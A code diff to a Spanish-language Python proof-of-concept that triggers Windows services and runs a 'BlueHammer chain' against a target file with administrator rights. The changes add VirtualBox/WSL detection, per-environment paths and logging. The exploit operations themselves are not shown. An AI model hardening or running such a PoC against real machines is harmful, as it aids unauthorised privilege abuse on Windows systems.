@@ -2,6 +2,7 @@
 """
 PoC - Disparador de Servicios Windows con Ejecución Robusta
 Requiere permisos de administrador
+Versión adaptada para VirtualBox
 """
 
 from enum import Enum
@@ -22,9 +23,34 @@ import tempfile
 
 # ========== CONFIGURACIÓN GLOBAL ==========
 
-# Crear directorio de logs
-LOG_DIR = Path(tempfile.gettempdir()) / "tejon_logs"
-LOG_DIR.mkdir(exist_ok=True)
+# Detectar si estamos en VirtualBox/WSL
+def detectar_entorno_virtualizacion():
+    """Detecta si estamos en VirtualBox o WSL"""
+    try:
+        resultado = subprocess.run(
+            ["systeminfo"],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        if "VirtualBox" in resultado.stdout or "VBox" in resultado.stdout:
+            return "virtualbox"
+        elif "Microsoft" in resultado.stdout or "WSL" in resultado.stdout:
+            return "wsl"
+    except:
+        pass
+    return "native"
+
+ENTORNO = detectar_entorno_virtualizacion()
+
+# Crear directorio de logs adaptado al entorno
+if ENTORNO == "virtualbox":
+    # En VirtualBox, usar ruta compartida o ProgramData
+    LOG_DIR = Path(os.environ.get("PROGRAMDATA", "C:\\ProgramData")) / "tejon_logs"
+else:
+    LOG_DIR = Path(tempfile.gettempdir()) / "tejon_logs"
+
+LOG_DIR.mkdir(exist_ok=True, parents=True)
 
 # Configurar logging con rotación
 log_formatter = logging.Formatter(
@@ -47,8 +73,13 @@ logger.setLevel(logging.DEBUG)
 logger.addHandler(file_handler)
 logger.addHandler(console_handler)
 
-# CONSTANTES
-ARCHIVO_DESTINO = r"C:\temp\target.bin"
+# CONSTANTES - Rutas adaptadas para VirtualBox
+if ENTORNO == "virtualbox":
+    # Usar rutas accesibles en VirtualBox (carpetas compartidas o directorios públicos)
+    ARCHIVO_DESTINO = r"C:\Users\Public\Documents\target.bin"
+else:
+    ARCHIVO_DESTINO = r"C:\temp\target.bin"
+
 TIMEOUT_DEFECTO = 60  # segundos
 REINTENTOS_DEFECTO = 3
 DRY_RUN = False  # Cambiar a True para modo prueba
@@ -130,6 +161,8 @@ def validar_entorno() -> bool:
     if sys.version_info < (3, 8):
         logger.error("[x] Se requiere Python 3.8+")
         return False
+    
+    logger.info(f"[*] Entorno detectado: {ENTORNO}")
     
     # Verificar que PowerShell está disponible
     try:
@@ -294,6 +327,17 @@ def ejecutar_cmd(comando: List[str], timeout: int = TIMEOUT_DEFECTO) -> dict:
     }
 
 
+def validar_ruta_accesible(ruta: str) -> bool:
+    """Valida que una ruta sea accesible en el entorno actual"""
+    try:
+        path = Path(ruta)
+        path.parent.mkdir(parents=True, exist_ok=True)
+        return True
+    except Exception as e:
+        logger.warning(f"No se puede acceder a {ruta}: {e}")
+        return False
+
+
 # ========== IMPLEMENTACIONES DE TRIGGERS ==========
 
 @manejo_errores(timeout=120, reintentos=2)
@@ -386,9 +430,16 @@ def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECT
     logger.info(f"[*] Ejecutando BlueHammer chain con destino: {archivo_destino}")
     
     # Validar que el path es válido
+    if not validar_ruta_accesible(archivo_destino):
+        logger.warning(f"[!] Ruta {archivo_destino} no es accesible, usando ruta alternativa")
+        archivo_destino = str(Path.home() / "target.bin")
+    
     target_path = Path(archivo_destino)
-    if not target_path.parent.exists():
+    try:
         target_path.parent.mkdir(parents=True, exist_ok=True)
+    except Exception as e:
+        logger.error(f"No se pudo crear directorio: {e}")
+        raise
     
     # Operaciones de BlueHammer
     operaciones = [
@@ -434,6 +485,9 @@ class DispatcherServicios:
         logger.info("=" * 70)
         logger.info("VALIDACION DE ENTORNO")
         logger.info("=" * 70)
+        logger.info(f"[*] Entorno detectado: {ENTORNO}")
+        logger.info(f"[*] Ruta de logs: {LOG_DIR}")
+        logger.info(f"[*] Archivo destino: {ARCHIVO_DESTINO}")
         
         if not validar_entorno():
             logger.error("[x] Validacion de entorno fallida")
@@ -512,7 +566,8 @@ class DispatcherServicios:
                 "sesion": {
                     "inicio": self._inicio_sesion.isoformat(),
                     "fin": datetime.now().isoformat(),
-                    "resumen": self.obtener_resumen()
+                    "resumen": self.obtener_resumen(),
+                    "entorno": ENTORNO
                 },
                 "resultados": [r.to_dict() for r in self._resultados]
             }
@@ -528,6 +583,7 @@ class DispatcherServicios:
         
         elif formato == "txt":
             lineas = ["=" * 70, "REPORTE DE EJECUCION", "=" * 70]
+            lineas.append(f"Entorno: {ENTORNO}\n")
             resumen = self.obtener_resumen()
             lineas.append(f"Exitosas: {resumen['exitosas']}/{resumen['total']}")
             lineas.append(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
